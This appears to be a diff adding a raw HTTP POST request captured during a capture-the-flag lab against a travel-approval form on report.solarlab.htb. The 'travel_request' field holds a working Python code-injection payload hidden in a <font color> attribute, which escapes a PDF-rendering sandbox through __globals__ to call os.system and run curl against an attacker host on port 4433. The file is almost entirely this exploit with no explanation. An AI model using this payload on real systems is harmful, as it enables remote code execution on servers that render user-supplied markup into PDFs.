@@ -1,0 +1,65 @@
+POST /travelApprovalForm HTTP/1.1
+
+Host: report.solarlab.htb:6791
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate, br
+
+Referer: http://report.solarlab.htb:6791/travelApprovalForm
+
+Content-Type: multipart/form-data; boundary=---------------------------225472457215346341293468967505
+
+Content-Length: 1249
+
+Origin: http://report.solarlab.htb:6791
+
+DNT: 1
+
+Connection: close
+
+Cookie: session=.eJwlzjsOwjAMANC7ZGaw4ySOe5nK8UewtnRC3J1KHOBJ71P2POJ8lu19XPEo-8vLVtTEwaMaT2qddOEEoRpUOUdP8k7SkGgCRyLADBi8aAiJ-kqP1rXSQqnapTEHDsekNBtut8UF7kMBrYUKJy5kdNAB00AEyx25zjj-GyzfH37qLps.ZqJe9g.U_LcXmXLe05WEr0jnloH7Vv2KLg
+
+Upgrade-Insecure-Requests: 1
+
+Sec-GPC: 1
+
+
+
+-----------------------------225472457215346341293468967505
+
+Content-Disposition: form-data; name="time_interval"
+
+
+
+2024-07-02 to 2024-07-04
+
+-----------------------------225472457215346341293468967505
+
+Content-Disposition: form-data; name="travel_request"
+
+
+
+<para>
+
+    <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('curl 10.10.x.x:4433') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
+
+        exploit
+
+    </font>
+
+</para>
+
+-----------------------------225472457215346341293468967505
+
+Content-Disposition: form-data; name="signature"; filename="sign.jpg"
+
+Content-Type: image/jpeg
+
+
+
+ÿØÿà
